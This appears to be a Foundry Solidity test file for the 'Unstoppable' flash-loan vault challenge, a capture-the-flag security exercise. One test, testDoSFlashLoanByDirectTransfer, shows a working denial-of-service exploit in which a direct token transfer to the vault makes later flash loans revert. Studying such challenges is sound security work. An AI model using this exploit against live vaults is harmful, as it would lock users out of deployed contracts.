// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {ERC20Mock} from "../Mock/ERC20Mock.sol";
import {ERC20} from "solmate/tokens/ERC4626.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156.sol";

import {UtilsTest} from "../Utils.t.sol";

contract UnstoppableVaultTest is UtilsTest {
    function setUp() public override {
        // vm.warp(1_000_000);
        // vm.warp(1_753_709_184);
        UtilsTest.setUp();
    }

    function testVariables() public view {
        console2.log("Total Asset ", vault.totalAssets());
        console2.log("Max Flash Loan ", vault.maxFlashLoan(address(token)));
        console2.log("Asset ", token.balanceOf(address(vault)));
        console2.log("Flash Fee ", vault.flashFee(address(token), 10));
    }

    function testFlashLoan() public {
        vm.startPrank(address(monitor));
        vault.flashLoan(IERC3156FlashBorrower(monitor), address(token), 10, "");
        vm.stopPrank();
    }

    function testDoSFlashLoanByDirectTransfer() public {
        // 1. Attacker directly transfers 1 token to the vault
        vm.startPrank(attacker);
        token.mint(attacker, 1);
        token.transfer(address(vault), 1);
        vm.stopPrank();

        // 2. A legitimate user tries to take a flash loan
        vm.startPrank(address(this));
        token.mint(address(this), 20);
        token.approve(address(vault), 20);
        vault.deposit(20, address(this));

        vm.expectRevert();
        vault.flashLoan(IERC3156FlashBorrower(monitor), address(token), 10, "");
        vm.stopPrank();
    }

    function testFlashLoanChargesZeroFeeBeforeEnd() public {
        vm.warp(0); // Start time, before 'end'

        // Setup: Mint + deposit to vault so it has liquidity
        token.mint(address(this), 100);
        token.approve(address(vault), 100);
        vault.deposit(100, address(this));

        // Confirm vault has assets
        assertEq(token.balanceOf(address(vault)), 100);

        // Setup: Monitor has no token balance (only allowed to borrow)
        vm.startPrank(address(monitor));
        token.mint(address(monitor), 0);
        token.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        // Flash loan before `end` and with amount < maxFlashLoan, so fee should be zero
        uint256 expectedFee = vault.flashFee(address(token), 10);
        assertEq(expectedFee, 0, "Fee should be 0 before end");

        // Run flashLoan
        vm.startPrank(address(monitor));
        vault.flashLoan(IERC3156FlashBorrower(monitor), address(token), 10, "");
        vm.stopPrank();

        // Vault balance should still be correct
        assertEq(
            token.balanceOf(address(vault)),
            100,
            "No net loss should occur"
        );
    }
}
